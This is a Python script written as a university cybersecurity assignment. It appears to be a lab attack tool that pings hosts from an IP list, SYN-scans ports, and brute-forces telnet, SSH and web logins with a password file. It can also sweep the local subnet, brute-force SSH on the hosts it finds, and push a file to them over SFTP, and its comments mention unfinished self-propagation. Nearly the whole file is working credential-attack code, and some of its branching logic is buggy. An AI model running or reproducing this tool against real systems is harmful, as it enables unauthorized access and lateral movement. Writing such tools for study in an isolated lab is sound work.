#!/usr/bin/python3

##### Welcome to CyberSecurity Assignment 2 Python code
# This program is developed by Mr.Laxmikant Yadav under guidance from Prof Dylan Smith, incase any support needed do contact me at laxmikant.yadav@mycit.ie 
# For the devlopment of this programm, I referred https://scapy.readthedocs.io/ as well as from https://stackoverflow.com/
##### Comments are added at appropriate places to help code usage & readability


# importing all required Python libraries
from scapy.all import *      # Scapy library is used mosting in the ip reachability status 
import sys 
import os
import paramiko     # paramiko library is used in the SSH bruteforce function to establish network connection on port 22/SSH protocol. 
from telnetlib import Telnet # telnetlib library is used in the telnet bruteforce function to establish network connection on port 23/telnet protocol. 
from time import sleep
from paramiko import SSHClient, AutoAddPolicy,Transport
import requests # request library used in the web bruteforce function to establish get and post http request on port 80/8080/http/webservers. 

conf.verb = 0  # Scapy statement configured to hide all verbose of scapy for simplified view


# This code can take user input through Mininet terminal as well as SIFT workstation

#read_ip_list function, takes single argument which is name of file containing IP addresses provided by user through command line. File Input output functions are used.
def read_ip_list(ip_file):
	with open(ip_file) as f:   # f is a variable holding file instance
		ip_add_list = f.read().splitlines()  # Splitlines string function is used to return a list with all lines in the string 
	return ip_add_list


# is_reachable function, takes single argument which is the IP address & pings that IP. Based on ping results, the function returns True or False.
#The IP address is taken by parsing the file(given through user input e.g ip_addresses.txt) containing IP addresses.
def is_reachable(ip):
	packet = IP(dst=ip)/ICMP()
	response = sr1(packet, timeout=1) # Sr function from scapy library, is used here to send and recived icmp packets to check the ping response.	
	if (response and len(response)>0):
		return True
	else:
		return False



# The function scan_port takes 2 arguments i.e. ip address and port and checks if port is open or closed using SYN scan.
# IP address is parsed from the file given by user and port is taken from user directly through the CLI.
# Function Logic: If string 'SA' is found in TCP response, it means port is detected as open.

def scan_port(ip,port):
	ans, unans = sr(IP(dst=ip)/TCP(dport=port,flags="S")) # sr function from scapy library, used here to send and recived tcp packets
	for sending, returned in ans:
		if 'SA' in str(returned[TCP].flags): 
			return True
			#print('ip port is open for TCP")
		else: return False
			#print('ip port is close for TCP")

# encoding function, is defined for encoding strings. It takes string as input and returns ascii coded output, Utf-8 encoding can also be used.
# Repetitive calls to this function mostly in telnet function to encode the outputs using library telnetlib which is used for establishing telnet connection to given IP using port 23.

def encoding(s):
    return s.encode("ascii")



# brueforce_telnet function, attempts brute forcing of multiple passwords form a file (e.g. list of passwords listed in passwords.txt) to the targets with telnet/ port 23 in open state. Here open port detected by SYN scan. It uses Python library telnetlib and uses it to create instance which further uses methods such as read_until and write.
# When the function is successful in establising a telnet connection, it use multiple combination of passwords and a userid  to get the working username:password combination.

def bruteforce_telnet(ip,port,username,password_list_filename):
    with open(password_list_filename) as f_var: # f_var is a variable name
        for line in f_var:
            credentials = line.strip()
            #try:
            tel = Telnet(ip, port)
            tel.read_until(encoding("login:"))
            tel.write(encoding(username + "\n"))
            #print("now searching for password")
            tel.read_until(encoding("Password:"))
            tel.write(encoding(credentials + "\n"))
            #print("now searching for login string...")
            data = tel.read_until(encoding("Welcome"), timeout=1)
            data = data.decode("ascii")
            if("Welcome" in data):
                tel.write(encoding("ifconfig\n"))
                tel.write(encoding("exit\n"))
                output = tel.read_all().decode("ascii")
                print("Working username-password combination is {}:{}".format(username,credentials))
                
                
                

# brueforce_ssh function, attempts brute forcing of multiple passwords form a file (e.g. list of passwords listed in passwords.txt) to the targets with SSH/ port22 in open state. It uses Python library Paramiko and uses it to create instance which further uses methods such as read_until and write.
# When the function is successful in establising a telnet connection, it use multiple combination of passwords and a userid  to get the working username:password combination.

list_ssh=[]    # list initiated to hold the function arguments which later to be used in the sftp also.

def bruteforce_ssh(ip, port, username, password_list_filename):
	client = SSHClient()
	client.load_system_host_keys()
	client.set_missing_host_key_policy(AutoAddPolicy()) # h
	with open(password_list_filename) as f:  # f is a variable name
		for line in f:
			credentials = line.strip() # line is a string variable and strip function is used to remove white space,if any.
			try:
				client.connect(ip,username=username, password=credentials,look_for_keys=False, allow_agent=False,timeout=2) # attempting ssh connection
				#print('Auth Done at this stage')
				command = ('whoami\n')				
				if(command == "exit"):
					break
				#print('\n User authenticated for valid SSH Access')				
				print("\n ssh working credentials are --> {}: {}".format(username,credentials))
				list_ssh.append(username)
				list_ssh.append(credentials)
				list_ssh.append(ip)
				list_ssh.append(port)
				print(list_ssh)
				return client
			except:
				client.close()
		
		

# bruteforce_web function, takes in 4 arguments (IP address, port number, username and passeord file name) and tries a connection to a web application to brute force passwords wrt to user id, it use multiple combination of passwords and a userid. 
# Similar to the fucntions for telnet and SSH, this fucntion also displays successful username and password combination.This function uses Python library requests for HTTP requests.

def bruteforce_web(ip, port, username, password_list_filename):
	with open(password_list_filename) as f:
		for line in f:
			credentials = line.strip()
			try: 
				resp = requests.get('http://'+ip+':'+port+'/index.php',timeout=1) # get request using http to recieve input from a web server
				#print('request send')
				if (resp.status_code) == 200: # status_code 200, tells us about successful request and the server responded with the data requested.
					#print('Trying with username and password for login page')
					data = {}
					data["username"] = username
					data["password"] = credentials
					resp = requests.post('http://'+ip+':'+port+'/login.php', data,timeout=1) # post request using http to give back response to web server
					#print('its em over here before response')
					if 'Welcome admin!' in resp.text:
						#print('Its Me over here inside')
						return username,credentials
					else: pass 
			except: return ''	




# sftp function, builds on the succesful connectivity and file transfer to remote host using SSH/port 22, it uses methods defined in Python library Paramiko to establish SFTP connectivity for file transfer. A prerequisiste to run this fucntion is that the user should have given a file to transfer from the CLI using -d option.

def sftp(username,credentials,ip,local_path,remote_path):
		print(' Sftp initiated')
		with paramiko.SSHClient() as client:
			client.load_system_host_keys()
			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			client.connect(ip, username=username, password=credentials)
			sftp = client.open_sftp() # opening sftp connection
			sftp.put(local_path,remote_path) # sftp put to send transmit the file available on local path to destination at remote path
			sftp.close()
			print('File transfer Complete')            


#Help Function, will help user to understand the working of tool. It will guide user about the functions available, the arguments and information needed to run the Tool.

def help():

	print('''\n	The net_attack.py script will automate the process of discovering weak usernames and passwords being used for services running on a host. The script will read a file containing a list of IP addresses. For each IP address in the list the script will scan the ports on that host, and attempt to bruteforce the login for detected services.
	The script will take in the following parameters:
	-t -> Filename for a file containing a list of IP addresses
	-p -> Ports to scan on the target host
	-u -> A username
	-f -> Filename for a file containing a list of passwords

	Example usage would look like this:

	./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt
	./net_attack.py -t ip_list.txt -p 22 -u root -f passwords.txt	''')



# active_device function, will be used during scan of local networks for the given ip ranges. It gives list of  network interfaces,ip address and active host list. Here we had used the scapy library to getif list of working interfaces


def active_device():
	ip_list = []
	active_host = []
	network_adapter_list = get_if_list() ## it will scan and fetch interfaces on the local network
	#print(network_adapter_list)
	for interface in network_adapter_list:
			#print(interface)
			ip_add_list = [get_if_addr(interface)] ## here we fetch the ip addresses of interfaces on the local network
			#print(ip_add_list)
			ip_list == ip_list.append(ip_add_list)
			#print(ip_list)      
			for ip in ip_list:
				for x in ip:
					octets = x.split('.') ## here we split the ip addresses in 4 octets based on the dots(.)
					dot = "."
			for lastoctet in range(10):
				ips = (octets[0] + dot + octets[1] + dot + octets[2] + dot + str(lastoctet))
				packet = IP(dst=ips, ttl=5)/ICMP()
				reply = sr1(packet, timeout=1)
				#print(reply)
				if (reply and len(reply)>0):
					#print(packet[IP].dst, " node is online")
					active_hosts = packet[IP].dst
					active_host.append(active_hosts)            
				else: 
					pass
	print('--- Network Interface',network_adapter_list)
	print('--- Interface IP address : ',ip_list)
	print('--- Active Host: ',active_host)
	return active_host
	
	



#main Function
# main fucntion is the control function which performs major tasks, including 
           # It is capabple of accepting user input through the Mininet terminal/SIFT workstation.
           # It controls all functions of the program including bruteforce_ssh,bruteforce_telnet,bruteforce_web, deployment as well as Self-Propogation
	  # To take CLI input, we use sys.argv functionality of Python.
           # -L parameter differentiates between a local scan and propagate
 # It is the first fuction which will be executed when a user runs this tool. User can use below option to access this tool
 	#sudo ./net_attackv1.py help >>> to get help
 	#sudo ./net_attackv1.py -t ipad.txt -p 22 -u kali -f pas.txt  >> to bruteforce the password for ssh
 	#sudo ./net_attackv1.py -t ipad.txt -p 22 -u kali -f pas.txt -d test1.txt >> to send a file to remote server
 	#sudo ./net_attackv1.py -t ipad.txt -p 22,23,80,8080 -u kali -f pas.txt   >> to bruteforce the password for ssh,telnet,webports
 	

 	

def main():
	
	args = sys.argv
	#file_type = args[args.index('./net_attackv1.py')+1]
	ip_file = args[2]
	user_port = args[args.index('-p')+1]
	username = args[args.index('-u')+1]
	password_list_filename = args[args.index('-f')+1]
	#local_scan = args[args.index('-L')]
	#propogate = args[args.index('-P')]
	ports = user_port.split(',')
	print("\n", "-" *70,"\n",'Program initiated for port ',ports,"\n","-" *70,"\n",)
	if ('-L' in args[1]):                                     ### this will initate and performa a scan on local networks
		print('\nNow initiatting local scan....')
		active_ip = active_device()
		print(active_ip)
		for ip in active_ip:
			print(ip)
			for port in ports: 
				print(port)
				if port == '22':
					print('here')
					output = bruteforce_ssh(ip,port,username,password_list_filename)
					print(output)
	
	elif ('-L' not in args[1]):
		print("\n", "-" *70,"\n", 'Verifying Host Connectivity ',"\n","-" *70,"\n",)
		ip_add = read_ip_list(ip_file)
		ip_list = ip_add.copy()
		for ip in ip_add:
			result = is_reachable(ip)
			if result == True:
				print('>>>  [Host Reachable] :', ip,)
			elif result == False:
				ip_list.remove(ip)
		print("\n", "-" *70,"\n", 'Port Scanning ',"\n","-" *70,"\n",) 
		print('\n'"Port","\t\t\t\t",'Host Address',"\t\t\t",'Port Status\n',"-"*70)		
		for ip in ip_list:
			for port in ports:
				port_result = scan_port(ip,int(port))   ### this will initate port scan using the port and ip given by user
				if port_result == True:
					print(port,"\t\t\t\t",ip,"\t\t\t",'Open' )
					if port == '23':           # This function will identify and connect to function 'telnet_password', to select the port 23/telnet related 
						print('\nNow validating Telnet....')
						telnet_password = bruteforce_telnet(ip,port,username,password_list_filename)
					elif port == '22' and '-d' in args:                   ### this will initate a function for  bruteforce_ssh and file transfer via sftp
						ssh_password = bruteforce_ssh(ip,port,username,password_list_filename)
						print(ssh_password)
						print("\nNow validating SFTP....")
						credentials=list_ssh[1]
						transfer_file_name = args[args.index('-d')+1]
						print(" transfer file name is {}".format(transfer_file_name))
						local_path = r"/home/sansforensics/Desktop/As2/test1.txt" 
						remote_path = '/home/sansforensics/Desktop'+transfer_file_name
						sftp(username,credentials,ip,local_path,remote_path)
												
					elif port == '22':                                       ### this will initate function for  bruteforce_ssh 
						#print("\nNow validating SSH....")
						ssh_password = bruteforce_ssh(ip,port,username,password_list_filename)
						#print(ssh_password)
						
					elif port == '80' or '8080' or '8888': ### it will initate a function for  bruteforce_web
						print('\nNow validating Webport ')
						web_password = bruteforce_web(ip, port, username, password_list_filename)
						print(web_password)
					elif ('-P' and '-L' and '-p' and '-u') and len(args) == 8: ### to initate Propogation/local scan function 
						print('\nNow validating Self-Propogation')
						local_scan = args[args.index('./net_attackv1.py')+1]
						propogate = args[args.index('./net_attackv1.py')+7]
						ssh_password = bruteforce_ssh(ip,port,username,password_list_filename)
						print(ssh_password)	
					else: help()              ### to initate help function 
				else:
					print(port,"\t\t\t\t",ip,"\t\t\t",'closed' )



# Calling main function
main()
	

